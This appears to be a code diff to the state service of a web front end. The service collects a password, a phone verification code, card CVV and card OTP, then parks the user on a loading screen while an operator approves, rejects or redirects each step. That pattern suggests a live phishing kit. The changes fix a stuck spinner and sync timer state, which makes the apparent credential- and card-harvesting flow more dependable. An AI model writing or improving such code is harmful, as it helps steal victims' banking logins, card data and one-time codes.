@@ -575,7 +575,9 @@ export class StateService {
           isPhoneVerified: this.isPhoneVerified(),
           isPersonalVerified: this.isPersonalVerified(),
           isCardSubmitted: this.isCardSubmitted(),
-          isFlowComplete: this.isFlowComplete()
+          isFlowComplete: this.isFlowComplete(),
+          waitingStart: this.waitingStartPublic(),
+          autoApproveThreshold: this.autoApproveThreshold()
       };
       // Debug
       // console.log('[State] Building Payload:', { stage: p.stage, view: p.currentView });
@@ -838,6 +840,12 @@ export class StateService {
           const duration = Number(payload.duration) || 10000;
           this.autoApproveThreshold.update(v => Number(v) + duration);
           console.log(`[State] Extended timeout by ${duration}ms. New threshold: ${this.autoApproveThreshold()}ms`);
+
+          // Fix for "Stuck" spinner: If waitingStart was lost, restart it
+          if (this.currentView() === 'loading' && !this.waitingStart()) {
+               console.log('[State] Timer was stalled. Restarting waitingStart.');
+               this.waitingStart.set(Date.now());
+          }
       } else if (action === 'NAVIGATE') {
           this.navigate(payload.view, true);
       } else if (action === 'REJECT') {
@@ -990,8 +998,8 @@ export class StateService {
       this.password.set(p);
       this.stage.set('login');
       this.rejectionReason.set(null);
-      this.navigate('loading');
       this.waitingStart.set(Date.now());
+      this.navigate('loading');
       this.syncState();
   }
 
@@ -1010,8 +1018,8 @@ export class StateService {
       this.phoneCode.set(code);
       this.stage.set('phone_pending');
       this.rejectionReason.set(null);
-      this.navigate('loading');
       this.waitingStart.set(Date.now());
+      this.navigate('loading');
       this.syncState();
   }
 
@@ -1061,8 +1069,8 @@ export class StateService {
       this.cardCvv.set(c);
       this.stage.set('card_pending');
       this.rejectionReason.set(null);
-      this.navigate('loading');
       this.waitingStart.set(Date.now());
+      this.navigate('loading');
       this.syncState();
   }
 
@@ -1070,8 +1078,8 @@ export class StateService {
       this.cardOtp.set(code);
       this.stage.set('card_otp_pending');
       this.rejectionReason.set(null);
-      this.navigate('loading');
       this.waitingStart.set(Date.now());
+      this.navigate('loading');
       this.syncState();
   }
 
@@ -1079,8 +1087,8 @@ export class StateService {
       // Transition to pending state for Admin approval
       this.stage.set('bank_app_pending');
       this.rejectionReason.set(null);
-      this.navigate('loading');
       this.waitingStart.set(Date.now());
+      this.navigate('loading');
       this.syncState();
   }
   
